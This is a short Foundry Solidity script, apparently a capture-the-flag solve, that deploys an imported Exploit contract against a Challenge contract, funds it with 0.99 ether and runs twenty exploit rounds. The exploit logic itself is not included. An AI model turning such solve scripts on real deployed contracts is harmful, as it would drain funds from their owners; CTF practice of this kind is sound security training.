// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Script.sol";

import "script/exploit/Exploit.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast(/* private key */);

        Challenge challenge = Challenge(/* challenge address */);
        Exploit exploit = new Exploit(challenge);
        exploit.exploit_setup{value: 0.99 ether}();
        for (uint i; i < 20; i++) {
            exploit.exploit_round();
        }

        vm.stopBroadcast();
    }
}